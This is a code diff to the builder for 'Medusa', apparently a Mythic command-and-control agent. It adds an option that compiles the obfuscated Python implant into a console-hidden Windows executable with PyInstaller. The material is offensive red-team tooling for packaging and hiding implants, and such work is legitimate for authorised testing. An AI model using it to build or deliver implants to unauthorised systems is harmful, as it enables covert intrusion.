@@ -27,7 +27,7 @@ class Medusa(PayloadType):
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
             description="Choose output format",
-            choices=["py", "base64"],
+            choices=["py", "base64", "exe"],
             default_value="py"
         ),
         BuildParameter(
@@ -67,7 +67,8 @@ class Medusa(PayloadType):
 
     build_steps = [
         BuildStep(step_name="Gathering Files", step_description="Creating script payload"),
-        BuildStep(step_name="Obfuscating Script", step_description="Encoding and encrypting script content")
+        BuildStep(step_name="Obfuscating Script", step_description="Encoding and encrypting script content"),
+        BuildStep(step_name="Compiling to EXE", step_description="Converting python script to windows executable")
     ]
 
     translation_container = None
@@ -345,7 +346,47 @@ exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encod
                     StepSuccess=True
                 ))
 
-            if self.get_parameter("output") == "base64":
+            if self.get_parameter("output") == "exe":
+                if self.get_os() != SupportedOS.Windows:
+                    raise ValueError("EXE output is only supported when target OS is Windows")
+
+                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                    PayloadUUID=self.uuid,
+                    StepName="Compiling to EXE",
+                    StepStdout="Starting PyInstaller compilation...",
+                    StepSuccess=True
+                ))
+
+                with tempfile.TemporaryDirectory() as tmpdir:
+                    script_path = os.path.join(tmpdir, "agent.py")
+                    with open(script_path, "w") as f:
+                        f.write(base_code)
+
+                    cmd = f"pyinstaller --onefile --noconsole --clean --distpath {tmpdir} --workpath {tmpdir}/build {script_path}"
+
+                    process = await asyncio.create_subprocess_shell(
+                        cmd,
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE
+                    )
+                    stdout, stderr = await process.communicate()
+
+                    if process.returncode != 0:
+                        raise Exception(f"PyInstaller failed: {stderr.decode()}")
+
+                    exe_path = os.path.join(tmpdir, "agent.exe")
+                    with open(exe_path, "rb") as f:
+                        resp.payload = f.read()
+
+                    resp.build_message = "Successfully built Windows EXE!"
+                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Compiling to EXE",
+                        StepStdout="Executable created successfully.",
+                        StepSuccess=True
+                    ))
+
+            elif self.get_parameter("output") == "base64":
                 resp.payload = base64.b64encode(base_code.encode())
                 resp.build_message = "Successfully Built"
             else:
